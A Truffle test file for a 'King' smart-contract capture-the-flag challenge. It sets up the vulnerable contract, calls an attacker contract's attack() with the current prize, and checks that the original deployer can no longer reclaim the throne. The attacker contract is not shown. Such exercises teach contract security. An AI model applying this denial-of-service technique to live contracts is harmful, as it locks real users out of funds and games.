const { ether, expectRevert, expectEvent } = require('@openzeppelin/test-helpers');

const King = artifacts.require('King');
const AttackKing = artifacts.require('AttackKing');

const { expect } = require('chai');
const send = require('@openzeppelin/test-helpers/src/send');

contract('[Challenge] King', function ([deployer, attacker, someUser, ...otherAccounts]) {
  const INIT_PRIZE = ether('1');

  before(async function () {
    /** SETUP SCENARIO */
    this.king = await King.new({ from: deployer, value: INIT_PRIZE });
    this.attackKing = await AttackKing.new(this.king.address, { from: attacker });
  });

  it('Exploit', async function () {
    /** YOUR EXPLOIT GOES HERE */
    let prize = await this.king.prize();
    await this.attackKing.attack({ from: attacker, value: prize });
  });

  after(async function () {
    /** SUCCESS CONDITIONS */
    let prize = await this.king.prize();
    await expectRevert(send.ether(deployer, this.king.address, prize), 'I am King!');
    expect(await this.king._king()).eq(this.attackKing.address);
  });
});
